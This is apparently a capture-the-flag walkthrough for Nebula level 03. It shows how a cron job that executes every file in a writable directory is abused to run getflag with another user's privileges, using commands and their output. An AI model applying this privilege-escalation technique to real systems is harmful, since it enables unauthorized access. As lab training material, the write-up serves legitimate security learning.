### Solution ###

`flag03`’s cronjobs can not be seen, but it can be assumed that it executes the script `writable.sh`.

```bash
level03@nebula:/home/flag03$ cat writable.sh
#!/bin/sh

for i in /home/flag03/writable.d/* ; do
  (ulimit -t 5; bash -x "$i")
  rm -f "$i"
done
```

`writable.sh` executes every script located in `writable.d/` in another shell.

```
level03@nebula:/home/flag03$ echo "getflag > /tmp/flag" > writable.d/exec
level03@nebula:/home/flag03$ chmod +x writable.d/exec
```

By creating a script that executes `getflag` in `writable.d/`, it can be successfully executed with `flag03`’s permissions.

```
level03@nebula:/home/flag03$ cat /tmp/flag
You have successfully executed getflag on a target account
```
